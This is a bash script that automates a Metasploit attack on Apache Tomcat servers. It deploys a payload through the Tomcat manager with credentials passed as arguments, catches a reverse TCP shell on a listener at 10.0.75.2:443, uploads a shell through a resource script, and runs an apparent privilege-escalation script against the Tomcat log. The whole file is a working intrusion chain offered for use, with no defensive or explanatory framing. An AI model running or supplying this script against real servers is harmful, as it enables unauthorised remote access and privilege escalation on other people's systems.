#!/bin/bash

msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set ExitOnSession false; set LHOST 10.0.75.2; set LPORT 443; exploit -j; use exploit/multi/http/tomcat_mgr_deploy; set HttpPassword $2; set HttpUsername $1; set PATH $3; set target 1; set RPORT $5; set RHOST $4;set AutoRunScript multi_console_command -rc ./uploadShell.rc; exploit; sessions; sleep 3;sessions -c 'id'; sessions -c '/tmp/injectPrivileged.sh /var/log/tomcat7/catalina.out'"

if [ $? -ne 0 ]; then
    echo -e "\n Something went wrong"
    exit 1
fi

exit 0
